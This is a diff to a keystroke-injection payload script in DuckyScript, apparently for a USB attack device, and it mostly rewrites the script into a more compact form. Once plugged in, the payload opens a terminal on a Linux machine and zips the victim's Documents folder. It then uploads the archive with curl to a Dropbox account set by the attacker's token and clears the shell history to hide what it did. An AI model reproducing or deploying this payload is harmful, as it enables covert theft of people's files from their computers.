@@ -13,70 +13,37 @@ REM     - Internet Connection
 REM     - Dropbox Account
 REM     - - DROPBOX_ACCESS_TOKEN
 
+REM Required: Set here your Dropbox access TOKEN
+DEFINE #TOKEN example
+DEFINE #DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
 
-DELAY 1000
+
+DEFAULT_DELAY 500
 CTRL-ALT t
 
 DELAY 2000
-REM Required: Set here your Dropbox access TOKEN
-DEFINE TOKEN example
-STRING ACCESS_TOKEN="
-STRING TOKEN
-STRING "
-ENTER
+STRINGLN ACCESS_TOKEN="#TOKEN"
+STRINGLN USER_NAME=$(whoami)
+STRINGLN path="/home/$USER_NAME/Documents"
+STRINGLN RANDOM=$(shuf -i 1-999999999999 -n 1)
+STRINGLN NAME="$RANDOM.zip"
+STRINGLN ZIP_PATH="$path/$NAME"
 
-DELAY 500
-STRING USER_NAME=$(whoami)
-ENTER
-
-DELAY 500
-STRING path="/home/$USER_NAME/Documents"
-ENTER
-
-DELAY 500
-STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
-ENTER
-
-DELAY 500
-STRING NAME="$RANDOM.zip"
-ENTER
-
-DELAY 500
-STRING ZIP_PATH="$path/$NAME"
-ENTER
-
-DELAY 500
 REM The FOLDER that you want to zip, in this example you want to zip all Documents content
-STRING FOLDER="/home/$USER_NAME/Documents/"
-ENTER
+STRINGLN FOLDER="/home/$USER_NAME/Documents/"
 
 REM Delay for zipping operation, it depends by computer power and folder directory
 DELAY 10000
 
-DELAY 500
-STRING if [ -r "$FOLDER" ]; then
-ENTER
-STRING zip -r "$ZIP_PATH" "$FOLDER" > /dev/null 2>&1
-ENTER
-STRING else
-ENTER
-STRING echo   ""
-ENTER
-STRING fi
-ENTER
+STRINGLN if [ -r "$FOLDER" ]; then
+STRINGLN zip -r "$ZIP_PATH" "$FOLDER" > /dev/null 2>&1
+STRINGLN else
+STRINGLN echo   ""
+STRINGLN fi
 
-DELAY 500
-STRING DROPBOX_FOLDER="/$NAME"
-ENTER
+STRINGLN DROPBOX_FOLDER="/$NAME"
 
-
-DELAY 500
-DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
-STRING curl -X POST
-STRING DROPBOX_API_CONST
-STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
-ENTER
+STRINGLN curl -X POST DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
 
 DELAY 2000
-STRING history -c
-ENTER
+STRINGLN history -c
